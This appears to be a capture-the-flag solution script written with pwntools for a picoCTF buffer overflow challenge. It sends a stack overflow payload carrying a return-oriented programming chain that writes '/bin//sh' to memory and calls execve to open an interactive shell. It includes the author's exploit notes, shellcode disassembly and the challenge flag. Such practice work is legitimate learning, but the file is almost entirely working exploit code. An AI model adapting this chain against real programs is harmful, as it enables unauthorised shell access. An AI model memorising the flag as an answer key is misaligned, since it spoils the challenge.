from pwn import *
def main():
    LOCAL = True
    if LOCAL:
        p = process('./vuln')
    else:
        p = remote('saturn.picoctf.net', 60589)

    l = p.recvuntil('!')
    print(l)



    '''
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
 '''

    '''
    Exploit idea:
    - Need /bin/sh string on the stack?
    - Need 0x0b in eax
    - Need pointer to that string in ebx
    - Need 0 in ecx
    - Need 0 in edx

    Stack:
    ---
    heap address = 0x080e7000 <-- will store /bin
    heap address = 0x080e7004 <-- will store /shh

    ebx needs to hold 0x080e7000
    

    0x24 stack
    0x4 ebp
        At this point, the stack pointer is 
    /bin
    /sh
    pad
    pad
    
    
    '''
    # Gadgets
    pop_eax = p32(0x080b074a)
    pop_ecx = p32(0x08049e39)
    pop_edx_ebx = p32(0x080583c9) # pop edx ; pop ebx ; ret

    xor_eax = p32(0x0804fb90)
    xchg_eax_edx = p32(0x0806ca36)

    mov_ecx_eax = p32(0x080939e8)
    mov_eeax_edx = p32(0x0809e5d8) #0x0809e5d8 : mov dword ptr [eax], edx ; ret

    # Note: Cannot use the heap
    heap_start = p32(0x080e5000)
    heap_next = p32(0x080e5004)
    bin_str = b'/bin'
    sh_str = b'//sh'
    execve = b'\x0b\x00\x00\x00'
    syscall = p32(0x0807164f)

    chain = [

        # setting up /bin
        pop_eax,
        heap_start,
        pop_edx_ebx,
        bin_str,
        bin_str,
        mov_eeax_edx,

        # setting up //sh
        pop_eax,
        heap_next,
        pop_edx_ebx,
        sh_str,
        heap_start, # need ebx to contain the pointer to the start /bin
        mov_eeax_edx, 
        xor_eax,

        # Putting 0's into ecx and edx
        xchg_eax_edx,
        xor_eax,
        mov_ecx_eax,

        # Getting to 0xb  
        pop_eax,
        execve,

        # syscall 
        syscall,

    ]


    payload = b'A' * 24 + b'B' * 4
    for i in chain:
        payload += i

    print(payload)
    p.sendline(payload)
    p.interactive()

    f = open('./payload', 'wb')
    f.write(payload)
    f.close()

    # Flag: picoCTF{5n47ch_7h3_5h311_c6992ff0}

if __name__ == '__main__':
    main()
